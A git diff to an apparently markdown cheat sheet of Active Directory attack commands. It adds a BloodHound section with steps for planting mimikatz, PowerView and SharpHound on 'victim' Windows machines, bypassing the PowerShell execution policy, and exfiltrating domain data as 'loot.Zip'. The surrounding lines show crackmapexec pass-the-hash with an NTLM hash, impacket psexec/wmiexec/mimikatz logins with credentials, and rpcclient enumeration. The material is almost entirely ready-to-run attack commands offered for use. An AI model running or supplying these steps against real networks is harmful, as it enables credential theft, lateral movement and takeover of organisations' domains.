@@ -101,7 +101,38 @@ GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username
 enum4linux -a -u "user" -p "password" <DC IP>
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
-# Tool 7. IMPACKET.
+
+# Tool 7. Bloodhound.
+```
+First Start ------>>>>> neo4j console
+Open it in browser ------>>>>> http://localhost:7474/
+Login with ------>>>>> neo4j/123456 Default pass is {neo4j/neo4j}
+Open ------>>>>> bloodhound in terminal
+Login ------>>>>> user/pass
+```
+
+<h3> Connect with victim windows systems and put these 3 files. </h3>
+```
+1). mimikatz.exe
+2). powerView.ps1
+3). SharpHound.ps1
+```
+
+<h3> Use these cmds in victim systems. </h3>
+```
+1). powershell -ep bypass
+2). ..\SharpHound.ps1
+3). Invoke-Bloodhound -CollectionMethod All -Domain controller.local -ZipFileName loot.Zip
+```
+
+<h3> Take loot.Zip file to import bloodhound in our systems.  </h3>
+```
+1). import graph ---->>> uploaded file here
+2). Check it and enjoy it.
+```
+
+```
+# Tool 8. IMPACKET.
 ```
 impacket-psexec ad.domain/user:pass@IP
 impacket-wmiexec ad.domain/user:pass@IP
@@ -110,7 +141,7 @@ impacket-GetADUsers ad.domain/user:pass@IP
 impacket-mimikatz ad.domain/user:pass@IP
 impacket-smbpasswd ad.domain/user:pass@IP
 ```
-# Tool 8. RPC-Client.
+# Tool 9. RPC-Client.
 ```
 rpcclient -U ad.domain%user:pass IP
 Domain Information Query ----->>>> querydominfo
